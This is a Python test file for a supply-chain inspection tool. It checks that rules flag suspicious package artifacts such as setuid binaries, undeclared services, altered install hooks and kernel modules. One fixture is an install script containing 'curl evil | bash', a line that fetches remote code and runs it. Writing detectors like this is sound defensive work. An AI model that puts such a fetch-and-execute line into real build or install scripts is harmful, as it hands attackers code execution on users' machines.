"""Addendum 5 §12: the A-series artifact inspection (pure, no execution)."""

from trustsight.analysis.artifact import inspect_manifest


def _ids(manifest, declared=None):
    return {f["rule_id"] for f in inspect_manifest(manifest, declared)}


def test_a001_fires_for_an_unjustified_setuid_file():
    manifest = [{"path": "/usr/bin/suidtool", "setuid": True}]
    assert "A001" in _ids(manifest)
    assert "A001" not in _ids(manifest, {"mode_intent": "documented setuid"})


def test_a002_fires_for_an_undeclared_unit():
    manifest = [{"path": "/usr/lib/systemd/system/evil.service"}]
    assert "A002" in _ids(manifest)
    assert "A002" not in _ids(
        manifest,
        {"units": ["/usr/lib/systemd/system/evil.service"]},
    )


def test_a003_fires_for_a_library_outside_depends():
    manifest = [{"path": "/usr/bin/app", "links": ["libz.so.1", "libevil.so.2"]}]
    assert "A003" in _ids(manifest, {"depends": ["zlib"]})


def test_a004_fires_when_the_built_install_differs():
    declared = {
        "install_text": "post_install() { echo hi; }",
        "built_install_text": "post_install() { echo hi; curl evil | bash; }",
    }
    assert "A004" in _ids([], declared)


def test_a005_fires_for_world_writable_and_unusual_exec():
    manifest = [
        {"path": "/etc/skel/note", "world_writable": True},
        {"path": "/opt/tool/run", "mode": 0o755},
    ]
    ids = _ids(manifest)
    assert "A005" in ids


def test_executable_in_a_usual_path_is_not_a005():
    manifest = [{"path": "/usr/bin/tool", "mode": 0o755}]
    assert "A005" not in _ids(manifest)


def test_verify_build_is_unavailable_by_default(monkeypatch):
    monkeypatch.setattr("trustsight.config.load_config", lambda: {})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    result = client.verify_build("demo")
    assert result["status"] == "l9_unavailable"


def test_verify_build_inspects_when_enabled(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    result = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}])
    assert result["status"] == "l9_analyzed"
    assert any(f["rule_id"] == "A001" for f in result["findings"])


def test_a006_a007_a008_fire_on_privileged_and_bpf_artifacts():
    from trustsight.analysis.artifact import inspect_manifest

    ids = {f["rule_id"] for f in inspect_manifest([
        {"path": "/usr/bin/helper", "caps": "cap_setuid+ep"},
        {"path": "/etc/sudoers.d/pkg", "mode": 0o440},
        {"path": "/usr/lib/modules/6.1/evil.ko"},
        {"path": "/usr/lib/app/tracker.bpf.o"},
    ])}
    assert {"A006", "A007", "A008"} <= ids


def test_l9_divergence_when_static_and_artifact_disagree(monkeypatch):
    monkeypatch.setattr(
        "trustsight.config.load_config", lambda: {"verify": {"enabled": True}})
    from trustsight.api import TrustSight

    client = TrustSight(auto_import_seed=False)
    # Static clean, artifact has a HIGH finding -> divergence.
    diverging = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}],
        static_clean=True)
    assert diverging.get("l9_divergence") is True
    # Static also flagged -> no divergence.
    agreeing = client.verify_build(
        "demo", manifest=[{"path": "/usr/bin/x", "setuid": True}],
        static_clean=False)
    assert "l9_divergence" not in agreeing
